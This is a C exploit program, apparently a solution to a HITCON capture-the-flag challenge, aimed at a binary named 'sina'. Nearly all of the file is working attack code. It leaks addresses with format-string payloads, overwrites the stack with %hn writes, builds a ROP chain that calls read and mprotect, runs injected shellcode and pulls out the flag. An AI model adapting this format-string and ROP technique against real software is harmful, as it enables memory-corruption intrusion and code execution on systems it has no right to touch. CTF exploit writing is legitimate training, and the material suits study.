// You might have to run the exploit multiple times. Increasing the `usleep` time might also help.
// $ python3 sc_gen.py
// $ xxd -i sc.bin > shellcode.h
// $ gcc -o pwn -static pwn.c

#include <assert.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <signal.h>
#include <stdbool.h>
#include <sys/wait.h>

#include "shellcode.h"

char buff[0x10000];
int in_fd[2];
int out_fd[2];

void write_read() {
	usleep(100000);  // For stability
	printf("Sending \"%s\". ", buff);
	write(in_fd[1], buff, strlen(buff)+1);
	ssize_t n = read(out_fd[0], buff, sizeof(buff));
	printf("Received %d bytes.\n", n);
	return;
}

void write_stack(int offset1, int v1, int offset2, int v2) {
	int len = 0;
	int n1 = v1;
	int n2 = v2 - n1;
	while (n2 < 0) n2 += 0x10000;
	if (n1 >= 8 ) { 
		len += sprintf(buff+len, "%%%dx", n1);
	} else {
		for (int j = 0; j < n1; j++)
			len += sprintf(buff+len, "%%c");
	}
	len += sprintf(buff+len, "%%%d$hn", offset1 + 6);
	if (n2 >= 8 ) { 
		len += sprintf(buff+len, "%%%dx", n2);
	} else {
		for (int j = 0; j < n2; j++)
			len += sprintf(buff+len, "%%c");
	}
	len += sprintf(buff+len, "%%%d$hn", offset2 + 6);
	len += sprintf(buff+len, "%%4096x");
	write_read();
}

int main(int argc, char *argv[]) {
	printf("[*] Setup\n");

	pipe(in_fd);
	pipe(out_fd);

	pid_t pid = fork();
	if (pid < 0) {
		perror("fork error");
		exit(1);
	}
	if (pid == 0) {
		// In child
		close(out_fd[0]);
		dup2(out_fd[1], STDOUT_FILENO);
		close(out_fd[1]);

		close(in_fd[1]);
		dup2(in_fd[0], STDIN_FILENO);
		close(in_fd[0]);

		char *env[] = {"A=B", 0};
		execve("./sina", NULL, env);
	}
	// In parent
	close(in_fd[0]);
	close(out_fd[1]);

	printf("Child pid: %d\n", pid);

	printf("[*] Leak pointers\n");
	strcpy(buff, "%08x%32$hhn_%11$p_%9$p_%19$p_%13$p_%4096x");
	write_read();

	char *endptr;

	long ignore = strtol(buff, &endptr, 16);
	long binary_ptr = strtol(endptr+1, &endptr, 16);
	long libc_ptr = strtol(endptr+1, &endptr, 16);
	long ld_ptr = strtol(endptr+1, &endptr, 16);
	long stack_ptr = strtol(endptr+1, &endptr, 16);

	long binary = binary_ptr - 0x1159;
	long sc_addr = binary + 0x4088;
	long libc = libc_ptr - 0x2d57d;
	long pop_rdi = libc + 0x2dad2;
	long pop_rsi = libc + 0x2f2c1;
	long pop_rdx = libc + 0x1002c2;
	long libc_mprotect = libc + 0x106b90;
	long libc_read = libc + 0xfda10;
	long ld = ld_ptr - 0x37040;
	long stack_cleanup = ld + 0xe971; // add rsp, 0xd8 ; ret
	long ld_ret = ld + 0x5c6f;
	long ret_addr = stack_ptr - 0x210;
	long rop_addr = ret_addr + 8 + 0xd8;

	if ((ld_ret & (~0xffff)) != (stack_cleanup & (~0xffff))) {
		printf("Most significant 6 bytes of ld return address and stack cleanup gadgets are not equal.\n");
		printf("Try again.\n");
		exit(1);
	}

	printf("binary: %p\n", binary);
	printf("  sc addr: %p\n");
	printf("libc: %p\n", libc);
	printf("  pop rdi: %p\n", pop_rdi);
	printf("  pop rsi: %p\n", pop_rsi);
	printf("  pop rdx: %p\n", pop_rdx);
	printf("  mprotect: %p\n", libc_mprotect);
	printf("  read: %p\n", read);
	printf("ld: %p\n", ld);
	printf("  stack cleanup: %p\n", stack_cleanup);
	printf("  ld ret: %p\n", ld_ret);
	printf("stack: %p\n", stack_ptr);
	printf("  ret addr: %p\n", ret_addr);
	printf("  rop addr: %p\n", rop_addr);

	printf("Attach a debugger? ", pid);
	getchar();

	printf("[*] Redirect 2 stack pointers\n");
	write_stack(0x27, ret_addr & 0xffff, 4, (binary + 0x1159 - 0x11b8) & 0xffff);

	uint64_t rop[] = {
		// read(0, sc_addr, sizeof(sc_bin));
		pop_rdi,
		0,
		pop_rsi,
		sc_addr,
		pop_rdx,
		sizeof(sc_bin),
		libc_read,

		// mprotect(sc_addr & (~0xfff), 0x1000, 7);
		pop_rdi,
		sc_addr & (~0xfff),
		pop_rsi,
		0x1000,
		pop_rdx,
		7,
		libc_mprotect,

		// sc()
		sc_addr
	};

	printf("[*] Write ROP chain to stack\n");
	for (int i = 0; i < sizeof(rop); i += 2) {
		// Set pointer
		write_stack(0x38, (rop_addr + i) & 0xffff, 0x45, ld_ret & 0xffff);

		// Write byte
		write_stack(0x47, *(uint16_t *)((char *)rop + i), 0x45, ld_ret & 0xffff);
	}

	printf("[*] Trigger ROP\n");
	// We only need 1 write here, but we can hack that by doing 2 identical writes.
	write_stack(0x45, stack_cleanup & 0xffff, 0x45, stack_cleanup & 0xffff);

	printf("[*] Send shellcode\n");
	write(in_fd[1], &sc_bin, sizeof(sc_bin));

	printf("[*] Retrieve flag\n");
	ssize_t n = read(out_fd[0], buff, sizeof(buff));
	printf("Received %d bytes\n", n);
	char *flag = strstr(buff, "hitcon");
	if (flag) {
		char *flag_end = strstr(flag, "}");
		*(flag_end + 1) = 0;
		printf("Flag: %s\n", flag);
	} else {
		printf("No flag present.\n");
	}

	return 0;
}
